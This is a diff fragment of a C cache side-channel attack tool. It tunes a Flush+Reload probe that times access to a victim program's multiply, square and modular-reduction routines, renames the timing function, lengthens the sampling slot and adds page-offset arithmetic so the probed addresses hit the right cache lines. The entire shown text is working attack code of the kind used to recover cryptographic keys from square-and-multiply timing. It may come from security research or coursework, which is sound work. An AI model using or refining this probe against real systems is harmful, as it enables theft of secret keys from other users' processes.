@@ -30,7 +30,7 @@ static inline uint64_t rdtsc()
     return a;
 }
 
-static inline int memaccesstime(void *v)
+static inline int full_flush_reload(void *v)
 {
     int rv;
     asm volatile(
@@ -50,7 +50,7 @@ static inline int memaccesstime(void *v)
 
 void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr_timings, uint64_t *mod_timings, uint64_t SLOTS)
 {
-    const unsigned long SLOT_TIME = 1500;
+    const unsigned long SLOT_TIME = 2500;
     /*
         Waiting for threshhold
     */
@@ -73,9 +73,9 @@ void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr
     {
         uint64_t start_time = rdtsc();
         const uint64_t finish_time = start_time + SLOT_TIME;
-        uint64_t mul_time = memaccesstime(mul_fn_addr);
-        uint64_t sqr_time = memaccesstime(sqr_fn_addr);
-        uint64_t mod_time = memaccesstime(mod_fn_addr);
+        uint64_t mul_time = full_flush_reload(mul_fn_addr + (MUL_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
+        uint64_t sqr_time = full_flush_reload(sqr_fn_addr + (SQR_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
+        uint64_t mod_time = full_flush_reload(mod_fn_addr + (MOD_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
         if (mul_time < threshhold || sqr_time < threshhold || mod_time < threshhold)
         {
             printf("\r" BOLD(GRN("Threshhold triggered!")) "\n");
@@ -93,9 +93,9 @@ void probe(uint64_t threshhold, char *path, uint64_t *mul_timings, uint64_t *sqr
     {
         uint64_t start_time = rdtsc();
         const uint64_t finish_time = start_time + SLOT_TIME;
-        mul_timings[i] = memaccesstime(mul_fn_addr);
-        sqr_timings[i] = memaccesstime(sqr_fn_addr);
-        mod_timings[i] = memaccesstime(mod_fn_addr);
+        mul_timings[i] = full_flush_reload(mul_fn_addr + (MUL_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
+        sqr_timings[i] = full_flush_reload(sqr_fn_addr + (SQR_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
+        mod_timings[i] = full_flush_reload(mod_fn_addr + (MOD_OFFSET & (sysconf(_SC_PAGE_SIZE) - 1)));
         while (start_time < finish_time)
         {
             start_time = rdtsc();
